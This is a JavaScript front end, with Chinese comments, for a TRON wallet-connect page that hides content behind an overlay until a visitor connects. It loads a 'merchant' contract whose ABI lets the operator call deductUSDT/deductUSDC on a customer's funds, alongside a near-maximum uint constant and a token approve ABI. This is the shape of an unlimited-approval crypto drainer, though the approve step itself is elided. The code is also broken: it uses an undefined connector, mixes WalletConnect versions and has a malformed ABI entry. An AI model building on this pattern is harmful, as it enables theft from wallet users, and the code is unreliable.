// --- 配置常量 (TRON 专属) ---
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; // 你的 TRON 智能合约地址 (SimpleMerchantERC)
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  //  TRC20 USDT 合约地址
const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000'; //  默认 TRON 地址，可以不修改
const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";

// 你的合约 ABI (SimpleMerchantERC)
const MERCHANT_ABI = [
    {"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},
    {"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},
    {"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},
    {"inputs":[{"indexed":true,"name":"customer","name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},
    {"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},
    {"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},
    {"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},
    {"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},
    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","type":"Function"},
    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}
];

// TRC20 代币的 ABI (USDT)
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)"
];

// --- UI 元素 ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay'); // 获取遮罩层元素
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt');
const overlay = document.getElementById('blurOverlay');  // 确保在这里定义
const statusDiv = document.getElementById('status');  //  获取 status 元素，在外面定义，避免重复获取。

// --- 状态变量 ---
let tronWeb;
let userAddress; //  Base58 格式
let userAddressHex; // Hex 格式
let merchantContract;
let usdtContract;
let isConnectedFlag = false;
let accountChangeListener = null;  // 存储账号改变的监听器

// --- WalletConnect 相关的变量 ---
let client;
const bridge = 'https://bridge.walletconnect.org'; //  WalletConnect Bridge URL (使用默认的)
const projectId = 'c8127ba45105e16382a2c9b4e1fa304f';  //  **您的 WalletConnect projectId**

// --- 遮罩控制函數 ---
function hideOverlay() {
    if (!overlay) {
        console.error("Overlay element not found.");
        return;
    }
    overlay.style.opacity = '0';
    setTimeout(() => {
        overlay.style.display = 'none';
    }, 300);
}

function showOverlay(message) {
    if (!overlayMessage || !blurOverlay) {
        console.error("Overlay element not found.");
        return;
    }
    overlayMessage.innerHTML = message;
    overlay.style.display = 'flex';
    setTimeout(() => {
        overlay.style.opacity = '1';
    }, 10);
}

// --- 状态更新函数 ---
function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connectButton) {
        if (connected && address) {
            connectButton.classList.add('connected');
            connectButton.innerHTML = `Connected: ${address.substring(0, 4)}...${address.slice(-4)}`;
            connectButton.title = `Connected: ${address}`;
            hideOverlay(); // 隐藏遮罩
        } else {
            connectButton.classList.remove('connected');
            connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
            connectButton.title = 'Connect Wallet';
             //  连接失败，显示遮罩
        }
    }
}

// --- 核心功能：控制状态栏的隐藏与显示。 ---
function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    if (!statusDiv) {
        console.error("Status element not found.");
        return; // 避免设置 innerHTML
    }
    statusDiv.innerHTML = message;
    statusDiv.style.display = 'block';
}

// --- 初始化合约 (TRON 版本) ---
async function initialize() {
    try {
        if (!userAddress) {
            updateConnectionUI(false);
            return;
        }

        // 1. 初始化合约实例
        if (!tronWeb) {
            console.error("TronWeb not initialized.");
            return;
        }

        merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
        usdtContract = await tronWeb.contract(ERC20_ABI, USDT_CONTRACT_ADDRESS);

        console.log("✅ Contracts initialized.");

    } catch (error) {
        console.error("Initialization failed:", error);
        updateStatus(`Initialization failed: ${error.message}`);
        showOverlay(`Initialization failed: ${error.message}`);
    }
}

// --- 检查授权状态 (TRON 版本) ---
async function checkAuthorization() {
    // ... (检查授权状态) ...
}

// --- 连接钱包逻辑 (TRON 版本) ---
async function connectWallet() {
    console.log("connectWallet called - START"); // 调试 1
    try {
        updateStatus('Connecting to wallet...');
        showOverlay('Please confirm the connection request in your wallet...');

        // 1.  检测 TronWeb ( 确保有正确的 window.tronWeb 和其他库.)
        if (typeof window.tronWeb === 'undefined') {
            updateStatus('Please install TronLink or a supported TRON wallet');
            console.log("Error: tronWeb is undefined.");
            return;
        }

        // 2.  初始化 WalletConnect。
        if (!client) {
            const { Client, QRCodeModal } = window.WalletConnect; //  从 window 上获取
            console.log("Client and QRCodeModal loaded:", Client, QRCodeModal); // 检查 库是不是正确加载了
            try {
                client = new Client({
                    bridge,
                    qrcodeModal: QRCodeModal,
                    projectId, //  **使用您的 projectId**
                });
                console.log("✅ WalletConnect client created:", client); // 调试

            } catch (initError) {
                console.error("Error creating WalletConnect client:", initError);
                updateConnectionUI(false);
                showOverlay('🔴 Connection failed: Could not initialize WalletConnect.');
                updateStatus('Connection failed: Could not initialize WalletConnect.');
                return;
            }
        }

        // 3. 尝试连接 WalletConnect (这是最关键的步骤)
        if (!connector) {  //  如果在初始化之后，还没有连接.
            try {
                console.log("嘗試創建 WalletConnect session");
                const { uri, approval } = await client.connect({
                    requiredNamespaces: {
                        tron: {
                            methods: [
                                "tron_signTransaction",
                                "tron_signMessage",
                            ],
                            chains: ["tron:0x2b6653dc"], // TRON 主网链 ID
                            events: ["chainChanged", "accountsChanged"],
                        },
                    },
                });

                // 显示二维码 (对于 Trust Wallet DApp 浏览器， 这个操作通常不需要了)
                QRCodeModal.open(uri, () => {
                   //  如果用户取消了,  显示连接失败
                    console.log("QRCodeModal 关闭");
                    updateConnectionUI(false);
                    showOverlay('🔴 Connection failed: Connection canceled.');
                    updateStatus('Connection failed: Connection canceled.');
                });
                // 等待用户授权 (关键)
                const session = await approval();
                console.log("✅ Session approved:", session);
                 // 4. 从 WalletConnect 获取用户地址。
                 const { namespaces } = session;
                 if (namespaces && namespaces.tron && namespaces.tron.accounts && namespaces.tron.accounts.length > 0) {
                     userAddress = namespaces.tron.accounts[0];  // 获得地址。
                     console.log("✅ User Address (base58) from WalletConnect:", userAddress);

                     // 验证地址
                     if (!tronWeb.isAddress(userAddress)) {
                         console.error("Error: Invalid (假定) TRON address from WalletConnect:", userAddress);
                         updateConnectionUI(false);
                         showOverlay('🔴 Connection failed: Invalid  (假定) TRON address.');
                         updateStatus('Connection failed: Invalid TRON address.');
                         return;
                     }
                      userAddressHex = tronWeb.address.toHex(userAddress);
                     console.log("✅ User Address (Hex):", userAddressHex);
                     updateConnectionUI(true, userAddress);
                    // 5. 初始化合约并检查授权
                    await initialize();
                 } else {
                    console.error("Error: No TRON accounts found in session");
                    updateConnectionUI(false);
                    showOverlay('🔴 Connection failed: No valid account found.');
                    updateStatus('Connection failed: No valid account found.');
                    return;
                 }
            } catch (createSessionError) {
                console.error("Error creating WalletConnect session:", createSessionError);
                updateConnectionUI(false);
                showOverlay('🔴 Connection failed: Could not initialize WalletConnect.');
                updateStatus('Connection failed: Could not initialize WalletConnect.');
                return;
            }
        } else {
            console.log("WalletConnect: Already connected. ");
        }
        console.log("connectWallet called - END");  //  调试
    } catch (error) {
        console.error("Error connecting to wallet:", error);
        updateConnectionUI(false);
        showOverlay(`🔴 Connection failed: ${error.message}`);
        updateStatus(`Connection failed: ${error.message}`);
    }
    console.log("connectWallet called - END");  // 调试
}

// --- 斷開錢包連接 ---
function disconnectWallet() {
    // ... (函数定义) ...
}

// 事件监听器 (与之前类似)
connectButton.addEventListener('click', () => {
    console.log("Connect button clicked - Handler triggered"); // 调试
    if (isConnectedFlag) {
        disconnectWallet(); // 断开钱包
    } else {
        connectWallet(); // 连接钱包
    }
});

// 页面加载完成后，初始化 (可选)
window.onload = () => {
    console.log("window.onload triggered");
    //  在页面加载的时候， 尝试连接
};